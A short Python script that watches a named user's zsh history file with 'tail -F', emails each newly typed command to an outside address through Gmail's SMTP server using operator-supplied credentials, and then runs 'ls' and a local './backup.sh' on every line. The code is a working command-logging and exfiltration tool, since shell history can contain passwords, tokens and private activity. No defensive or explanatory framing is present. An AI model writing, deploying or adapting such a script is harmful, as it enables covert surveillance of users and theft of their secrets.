import sys
import os
import smtplib
import time
import subprocess
import select
line = ""
bashHistory = "/home/archie/.zsh_history"
f = subprocess.Popen(['tail','-F',bashHistory],\
	stdout=subprocess.PIPE,stderr=subprocess.PIPE)
p = select.poll()
p.register(f.stdout)
while True:
	if p.poll(1):
		line = f.stdout.readline()

		msg = str(line)
		print('sorted input ' + msg)
		fromaddr ="" #your email
		toaddrs = "" #youremail

#creds
		username ="" #username
		password ="" #password


		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		server.login(username,password)
		server.sendmail(fromaddr,toaddrs,msg)
		server.quit()
		print("email sent")
		
		#plugin execution string
		s = ["ls",'./backup.sh']
		#execute plugins
		for i in s:
        		os.system(i)
		
		time.sleep(1)
